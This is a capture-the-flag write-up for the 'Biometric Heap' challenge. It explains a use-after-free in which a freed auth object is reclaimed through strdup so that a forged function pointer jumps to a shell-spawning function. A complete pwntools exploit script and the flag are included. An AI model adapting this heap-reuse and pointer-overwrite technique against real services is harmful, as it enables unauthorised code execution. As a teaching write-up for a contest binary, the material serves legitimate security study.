# Biometric Heap

## Challenge

Connecting to the challenge brings up the following menu:

```
Welcome and congratulations on being hired!
Your biometrics have just been submitted, and a new password has been assigned to you.
Please contact your manager to obtain your password.



Available commands:
Exit - "q"
Change user - "reset"
Clear screen - "clear"
Bring up this menu - "h"
Login as current user - "login"
Identify user - "auth <user id>"
Request service - "service <service name>"
```

If we authenticate, an auth object is allocated and we can try to login.

A random password is generated at the start of the program for this.

If we successfully login, the program will call a function stored in the auth object.
By default the function is `biometrics_authenticator`:

```c
void sym.biometrics_authenticator(void) {
    sym.imp.puts("Under development.\n");
    sym.imp.puts(
                "Biometrics struct will be assigned a specialized biomtrics authentication function for each employee.\n"
                );
    sym.imp.exit(1);
    sym.imp.puts(
                "\nAvailable commands:\nExit - \"q\"\nChange user - \"reset\"\nClear screen - \"clear\"\nBring up this menu - \"h\"\nLogin as current user - \"login\"\nIdentify user - \"auth <user id>\"\nRequest service - \"service <service name>\"\n\n"
                );
    return;
}
```

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

There is a use-after-free vulnerability.
We can free the auth object with the "reset" command, but we can still access the "login" command.

The password and the function after login is stored in the auth object.
By creating an auth object with "auth", then freeing it with "reset", we can overwrite these fields
with our own password and function pointer.

The "service" command allows us to save data onto the heap using `strdup`.
If we can get `strdup` to allocate from the same bin as the freed auth object, we can overwrite its
fields.

So we create an auth object with "auth", free it with "reset" than create a fake object and store it
on the heap using "service".
We can choose our own password and function pointer for the fake object.
The password can be any string of length 8 (too short and the null byte would end the `strdup`, too
long and it overlaps the function pointer).
The function pointer can be the `employee_shell` function, which simply calls `system("/bin/sh")`:

```c
void sym.employee_shell(void) {
    sym.imp.system("/bin/sh");
    return;
}
```


## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host srv3.momandpopsflags.ca --port 3609 biometric_authenticator
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('biometric_authenticator')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'srv3.momandpopsflags.ca'
port = int(args.PORT or 3609)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

payload = flat({
    0x8: b'password',
    0x10: exe.sym['employee_shell'],
    })

io.sendlineafter(b"\"service <service name>\"\n\n", b"auth")
io.sendline(b"reset")
io.sendline(b"servic" + payload)
io.sendline(b"login")
io.sendlineafter(b"Please enter your password or \"q\" to quit: \n", b"password" + pack(exe.sym['employee_shell']))

io.interactive()
```

## Flag

```
magpie{[]v3rwhel|\/|ed_1ntern_()v3rfl0w}
```
